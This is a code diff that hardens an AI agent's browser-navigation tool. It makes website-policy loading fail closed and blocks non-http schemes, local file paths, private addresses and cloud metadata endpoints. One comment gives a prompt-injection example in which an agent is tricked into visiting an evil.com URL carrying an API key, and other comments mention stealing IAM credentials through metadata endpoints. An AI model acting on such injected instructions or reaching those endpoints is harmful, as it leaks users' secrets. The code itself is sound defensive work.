@@ -63,6 +63,7 @@ import tempfile
 import threading
 import time
 from datetime import datetime, timezone
+from urllib.parse import urlparse
 import requests
 from typing import Dict, Any, Optional, List, Tuple
 from pathlib import Path
@@ -73,8 +74,10 @@ from hermes_cli.config import cfg_get
 
 try:
     from tools.website_policy import check_website_access
-except Exception:
-    check_website_access = lambda url: None  # noqa: E731 — fail-open if policy module unavailable
+    _website_policy_import_error = None
+except Exception as exc:
+    check_website_access = None
+    _website_policy_import_error = exc
 
 try:
     from tools.url_safety import (
@@ -2713,6 +2716,110 @@ def _truncate_snapshot(snapshot_text: str, max_chars: int = 8000) -> str:
 # Browser Tool Functions
 # ============================================================================
 
+def _blocked_browser_navigation_response(
+    *,
+    session_key: str,
+    url: str,
+    message: str,
+    blocked_by_policy: Optional[Dict[str, Any]] = None,
+    failure_class: str = "policy_blocked",
+) -> str:
+    response: Dict[str, Any] = {
+        "success": False,
+        "error": message,
+    }
+    if blocked_by_policy:
+        response["blocked_by_policy"] = blocked_by_policy
+    response = _attach_browser_replay(
+        response,
+        session_key=session_key,
+        command="open",
+        action_args=[url],
+        url=url,
+    )
+    response["replay_failure_class"] = failure_class
+    return json.dumps(response, ensure_ascii=False)
+
+
+def _looks_like_local_file_target(url: str, parsed) -> bool:
+    if not isinstance(url, str):
+        return False
+    stripped = url.strip()
+    if not stripped:
+        return False
+    if stripped.startswith(("/", "./", "../", "~/", r"\\")):
+        return True
+    if re.match(r"^[A-Za-z]:[\\/]", stripped):
+        return True
+    has_host = bool((getattr(parsed, "hostname", None) or getattr(parsed, "netloc", "") or "").strip())
+    if has_host:
+        return False
+    path = (getattr(parsed, "path", "") or "").strip()
+    if path.startswith(("/", "./", "../", "~/")):
+        return True
+    return False
+
+
+def _preflight_browser_navigation(url: str, *, session_key: str) -> Optional[str]:
+    parsed = urlparse(url)
+    scheme = (parsed.scheme or "").lower()
+
+    if scheme and scheme not in {"http", "https"}:
+        return _blocked_browser_navigation_response(
+            session_key=session_key,
+            url=url,
+            message=(
+                f"Blocked: URL scheme '{scheme}' is not allowed in browser navigation. "
+                "Use browser tools only for http(s) destinations."
+            ),
+        )
+
+    if _looks_like_local_file_target(url, parsed):
+        return _blocked_browser_navigation_response(
+            session_key=session_key,
+            url=url,
+            message=(
+                "Blocked: local filesystem targets are not allowed in browser navigation. "
+                "Use browser tools only for http(s) destinations."
+            ),
+        )
+
+    if _website_policy_import_error is not None or not callable(check_website_access):
+        reason = _website_policy_import_error or "website policy module unavailable"
+        return _blocked_browser_navigation_response(
+            session_key=session_key,
+            url=url,
+            message=f"Blocked: website policy could not be loaded safely ({reason})",
+        )
+
+    try:
+        try:
+            blocked = check_website_access(url, strict_errors=True)
+        except TypeError as exc:
+            if "strict_errors" not in str(exc):
+                raise
+            blocked = check_website_access(url)
+    except Exception as exc:
+        return _blocked_browser_navigation_response(
+            session_key=session_key,
+            url=url,
+            message=f"Blocked: website policy could not be loaded safely ({exc})",
+        )
+
+    if blocked:
+        return _blocked_browser_navigation_response(
+            session_key=session_key,
+            url=url,
+            message=blocked["message"],
+            blocked_by_policy={
+                "host": blocked["host"],
+                "rule": blocked["rule"],
+                "source": blocked["source"],
+            },
+        )
+
+    return None
+
 def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
     """
     Navigate to a URL in the browser.
@@ -2724,19 +2831,25 @@ def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
     Returns:
         JSON string with navigation result (includes stealth features info on first nav)
     """
+    effective_task_id = task_id or "default"
+    nav_session_key = _navigation_session_key(effective_task_id, url)
+
     # Secret exfiltration protection — block URLs that embed API keys or
     # tokens in query parameters. A prompt injection could trick the agent
-    # into navigating to https://evil.com/steal?key=sk-ant-... to exfil secrets.
+    # into navigating to https://evil.com/steal?key=*** to exfil secrets.
     # Also check URL-decoded form to catch %2D encoding tricks (e.g. sk%2Dant%2D...).
     import urllib.parse
     from agent.redact import _PREFIX_RE
     url_decoded = urllib.parse.unquote(url)
     if _PREFIX_RE.search(url) or _PREFIX_RE.search(url_decoded):
-        return json.dumps({
-            "success": False,
-            "error": "Blocked: URL contains what appears to be an API key or token. "
-                     "Secrets must not be sent in URLs.",
-        })
+        return _blocked_browser_navigation_response(
+            session_key=nav_session_key,
+            url=url,
+            message=(
+                "Blocked: URL contains what appears to be an API key or token. "
+                "Secrets must not be sent in URLs."
+            ),
+        )
 
     # SSRF protection — block private/internal addresses before navigating.
     # Skipped for local backends (Camofox, headless Chromium without a cloud
@@ -2746,21 +2859,21 @@ def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
     # private URL + ``browser.auto_local_for_private_urls`` enabled) — the
     # cloud provider never sees the URL in that case.  Can also be opted
     # out globally via ``browser.allow_private_urls`` in config.
-    effective_task_id = task_id or "default"
-    nav_session_key = _navigation_session_key(effective_task_id, url)
     auto_local_this_nav = _is_local_sidecar_key(nav_session_key)
 
     # Always-blocked floor: cloud metadata / IMDS endpoints are denied
+
     # regardless of backend, hybrid routing, or allow_private_urls.
     # There's no legitimate agent use case for navigating to
     # 169.254.169.254 / metadata.google.internal / ECS task metadata
     # via a browser, and routing those to a local Chromium sidecar
     # on an EC2/GCP/Azure host exfiltrates IAM credentials (#16234).
     if not _is_local_backend() and _is_always_blocked_url(url):
-        return json.dumps({
-            "success": False,
-            "error": "Blocked: URL targets a cloud metadata endpoint",
-        })
+        return _blocked_browser_navigation_response(
+            session_key=nav_session_key,
+            url=url,
+            message="Blocked: URL targets a cloud metadata endpoint",
+        )
 
     if (
         not _is_local_backend()
@@ -2768,19 +2881,15 @@ def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
         and not _allow_private_urls()
         and not _is_safe_url(url)
     ):
-        return json.dumps({
-            "success": False,
-            "error": "Blocked: URL targets a private or internal address",
-        })
+        return _blocked_browser_navigation_response(
+            session_key=nav_session_key,
+            url=url,
+            message="Blocked: URL targets a private or internal address",
+        )
 
-    # Website policy check — block before navigating
-    blocked = check_website_access(url)
-    if blocked:
-        return json.dumps({
-            "success": False,
-            "error": blocked["message"],
-            "blocked_by_policy": {"host": blocked["host"], "rule": blocked["rule"], "source": blocked["source"]},
-        })
+    preflight_response = _preflight_browser_navigation(url, session_key=nav_session_key)
+    if preflight_response is not None:
+        return preflight_response
 
     # Camofox backend — delegate after safety checks pass
     if _is_camofox_mode():
@@ -2842,10 +2951,11 @@ def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
             and _is_always_blocked_url(final_url)
         ):
             _run_browser_command(nav_session_key, "open", ["about:blank"], timeout=10)
-            return json.dumps({
-                "success": False,
-                "error": "Blocked: redirect landed on a cloud metadata endpoint",
-            })
+            return _blocked_browser_navigation_response(
+                session_key=nav_session_key,
+                url=final_url,
+                message="Blocked: redirect landed on a cloud metadata endpoint",
+            )
 
         if (
             not _is_local_backend()
@@ -2855,10 +2965,11 @@ def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
         ):
             # Navigate away to a blank page to prevent snapshot leaks
             _run_browser_command(nav_session_key, "open", ["about:blank"], timeout=10)
-            return json.dumps({
-                "success": False,
-                "error": "Blocked: redirect landed on a private/internal address",
-            })
+            return _blocked_browser_navigation_response(
+                session_key=nav_session_key,
+                url=final_url,
+                message="Blocked: redirect landed on a private/internal address",
+            )
 
         response = {
             "success": True,
